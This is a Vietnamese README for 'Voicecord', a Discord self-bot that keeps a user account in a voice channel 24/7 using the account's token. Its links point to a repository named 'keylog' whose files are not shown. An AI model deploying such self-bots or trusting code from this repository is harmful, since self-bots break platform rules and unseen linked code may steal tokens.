# Voicecord
Tạo tài khoản bất hòa của bạn trực tuyến 24/7 trên các kênh thoại!

----

Code viết bằng Python giúp bạn giữ tài khoản 24/7 trên các kênh discord voice.

Yêu Finn Không =))

---

The [main.py](https://github.com/nobi101/keylog/blob/main/main.py) File Chính. [keep_alive.py](https://github.com/nobi101/keylog/blob/main/keep_alive.py) Giúp Bạn Treo 24/7. (Nếu bạn có kế hoạch thay thế hacker hoặc muốn chạy tập lệnh cục bộ, thì bạn có thể xóa [this file](https://github.com/nobi101/keylog/blob/main/keep_alive.py) và dán mã này vào bên trong [main.py](https://github.com/nobi101/keylog/blob/main/main.py) file : 

</br>

```py
import discord
import os
from discord.ext import commands

client=commands.Bot(command_prefix=':', self_bot=True, help_command=None)

GUILD_ID = ID_Server
CHANNEL_ID = ID_Channel

@client.event
async def on_ready():
    os.system('clear')
    print(f'Đăng Nhập Với Tên {client.user} ({client.user.id})')
    vc = discord.utils.get(client.get_guild(GUILD_ID).channels, id = CHANNEL_ID)
    await vc.guild.change_voice_state(channel=vc, self_mute=False, self_deaf=False)
    print(f"Tham Gia Thành Công {vc.name} ({vc.id})")

client.run(os.getenv("TOKEN"))
```


**KHÔNG ĐƯA TOKEN CỦA BẠN CHO NGƯỜI KHÁC!**

Sử dụng [uptimerobot.com](https://uptimerobot.com) để thay thế bạn trực tuyến 24/7.

</br>

> ⭐ Vui lòng gắn dấu sao cho kho lưu trữ nếu điều này giúp ích cho bạn! :)

----

> Voicecord của FINN nói không với keylog 
